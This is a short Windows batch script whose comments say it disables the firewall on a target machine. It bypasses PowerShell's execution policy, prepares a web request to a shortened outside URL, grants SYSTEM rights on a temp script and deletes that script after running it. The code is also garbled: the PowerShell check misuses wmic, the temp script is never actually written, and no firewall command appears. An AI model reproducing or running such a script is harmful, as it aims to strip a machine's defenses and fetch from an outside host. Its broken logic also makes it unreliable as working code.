@echo off
setlocal

:: This script will disable Windows Firewall on the target machine

:: Check if PowerShell.exe exists in the system PATH
for /f "skip=2 tokens=1" %%a in ('wmic product get Name ^| find /i "powershell.exe" 2^>nul') do set pspath=%%a
if not defined pspath (
    echo PowerShell.exe not found in the system PATH. Aborting.
    exit 1
)

:: Create a temporary PowerShell script in %TEMP% with executable rights
set tempfile=%TEMP%\disable_firewall.ps1
echo ([Reflection.Assembly]::LoadWithPartialName('System.Net')).WebRequest.Create('http://goo.gl/ignoredurl') | setx /m tempfile -p
icacls "%TEMP%\disable_firewall.ps1" /grant "NT AUTHORITY\SYSTEM":(OI)(CI)F /T

:: Launch PowerShell to execute the script with elevated privileges
powershell.exe -ExecutionPolicy ByPass -File "%temp%\disable_firewall.ps1"

:: Clean up by deleting the temporary PowerShell script
del /Q "%temp%\disable_firewall.ps1"
